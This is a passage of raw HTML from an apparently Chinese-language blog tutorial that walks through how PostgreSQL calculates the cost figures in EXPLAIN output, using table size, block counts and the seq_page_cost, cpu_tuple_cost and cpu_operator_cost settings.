class=\"crayon-o\">=</span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f85150033208-8\"><span class=\"crayon-h\">     </span><span class=\"crayon-v\">Filter</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">870123</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486f85150033208-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f85150033208-10\"><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rows</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486f85150033208-11\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0020 seconds] -->\r\n<p>在上面的例子中有很多的输出，但是可以得到它的要点。为了运行这个查询，PostgreSQL计划启动两个并行的工作进程（workers）。每个工作进程将在表上进行顺序扫描，最后，收集器合并来自两个工作进程的结果。</p>\n<p>在本文中，重点介绍上面输出的<code>cost</code>以及PostgreSQL如何计算它。</p>\n<p>为了简化成本探索，运行上面的查询，但限制可并行的工作进程数量为0。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a3486f8a366921736\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndb # SET max_parallel_workers_per_gather = 0;\r\n\r\ndb # EXPLAIN SELECT * FROM users WHERE id = 870123;\r\n\r\n                   QUERY PLAN\r\n--------------------------------------------------\r\n Seq Scan on users  (cost=0.00..17906.00 rows=1 width=9)\r\n   Filter: (id = 870123)\r\n\r\n(2 rows)\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f8a366921736-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f8a366921736-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f8a366921736-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f8a366921736-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f8a366921736-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f8a366921736-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f8a366921736-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f8a366921736-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f8a366921736-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f8a366921736-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f8a366921736-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a3486f8a366921736-1\"><span class=\"crayon-v\">db</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># SET max_parallel_workers_per_gather = 0;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f8a366921736-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a635a3486f8a366921736-3\"><span class=\"crayon-v\">db</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># EXPLAIN SELECT * FROM users WHERE id = 870123;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f8a366921736-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a635a3486f8a366921736-5\"><span class=\"crayon-h\">                   </span><span class=\"crayon-e\">QUERY </span><span class=\"crayon-v\">PLAN</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f8a366921736-6\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486f8a366921736-7\"><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Seq </span><span class=\"crayon-e\">Scan </span><span class=\"crayon-e\">on </span><span class=\"crayon-e\">users</span><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cost</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.00..17906.00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">width</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f8a366921736-8\"><span class=\"crayon-h\">   </span><span class=\"crayon-v\">Filter</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">870123</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486f8a366921736-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f8a366921736-10\"><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rows</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486f8a366921736-11\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n<p>这有点简单。在只有单CPU内核的情况下，评估成本是<code>17906</code>。</p>\n<h1 id=\"成本值背后的数学\">成本值背后的数学</h1>\n<p>在PostgreSQL中，成本或惩罚点大多是一个抽象的概念。PostgreSQL可以执行查询的方式很多，而PostgreSQL总是选择最低成本值的执行规划。</p>\n<p>计算成本，PostgreSQL首先查看表的字节数大小。接下来看看用户表的大小。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a3486f9a454043071\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndb # select pg_relation_size('users');\r\n\r\n pg_relation_size\r\n--------------------------\r\n     44285952\r\n(1 row)\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f9a454043071-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f9a454043071-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f9a454043071-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f9a454043071-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f9a454043071-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f9a454043071-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f9a454043071-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a3486f9a454043071-1\"><span class=\"crayon-v\">db</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># select pg_relation_size('users');</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f9a454043071-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a635a3486f9a454043071-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pg_relation_size</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f9a454043071-4\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486f9a454043071-5\"><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">44285952</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f9a454043071-6\"><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">row</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486f9a454043071-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>PostgreSQL会为每个要依次读取的块添加成本点。如果知道每个块都包含了<code>8kb</code>，那么就可以计算从表中读取的顺序块的成本值。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a3486f9e879391166\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nblock_size = 8192 # block size in bytes\r\nrelation_size = 44285952\r\n\r\nblocks = relation_size / block_size # =&gt; 5406\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f9e879391166-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f9e879391166-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f9e879391166-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f9e879391166-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f9e879391166-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a3486f9e879391166-1\"><span class=\"crayon-v\">block_size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8192</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># block size in bytes</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f9e879391166-2\"><span class=\"crayon-v\">relation_size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">44285952</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486f9e879391166-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f9e879391166-4\"><span class=\"crayon-v\">blocks</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">relation_size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">block_size</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># =&gt; 5406</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486f9e879391166-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>现在，已经知道块的数量，找出PostgreSQL为每个块读取分配多少个成本点。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a3486fa1424884339\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndb # SHOW seq_page_cost;\r\n seq_page_cost\r\n ----------\r\n 1\r\n(1 row)\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fa1424884339-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fa1424884339-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fa1424884339-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fa1424884339-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fa1424884339-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fa1424884339-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a3486fa1424884339-1\"><span class=\"crayon-v\">db</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># SHOW seq_page_cost;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fa1424884339-2\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">seq_page_cost</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486fa1424884339-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fa1424884339-4\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486fa1424884339-5\"><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">row</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fa1424884339-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>换句话说，PostgreSQL为每个块分配一个成本点。这就需要 <code>5406</code>个成本点从表中读取数据。</p>\n<p>从磁盘读取值并不是PostgreSQL需要做的。它必须将这些值发送给CPU并应用一个<code>WHERE</code>子句过滤。对于这个计算来说，如下的两个值非常有趣。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a3486fa5771638311\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndb # SHOW cpu_tuple_cost;\r\n\r\n cpu_tuple_cost\r\n--------------------\r\n  0.01\r\ndb # SHOW cpu_operator_cost;\r\n cpu_operator_cost\r\n ----------------\r\n  0.0025\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fa5771638311-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fa5771638311-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fa5771638311-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fa5771638311-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fa5771638311-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fa5771638311-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fa5771638311-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fa5771638311-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486fa5771638311-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486fa5771638311-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a3486fa5771638311-1\"><span class=\"crayon-v\">db</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># SHOW cpu_tuple_cost;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fa5771638311-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a635a3486fa5771638311-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cpu_tuple_cost</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fa5771638311-4\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486fa5771638311-5\"><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0.01</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fa5771638311-6\"><span class=\"crayon-v\">db</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># SHOW cpu_operator_cost;</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486fa5771638311-7\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cpu_operator_cost</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fa5771638311-8\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486fa5771638311-9\"><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0.0025</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486fa5771638311-10\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>现在，用所有的值来计算在<code>explain</code> 语句中得到的值。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a3486fa8313394220\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div 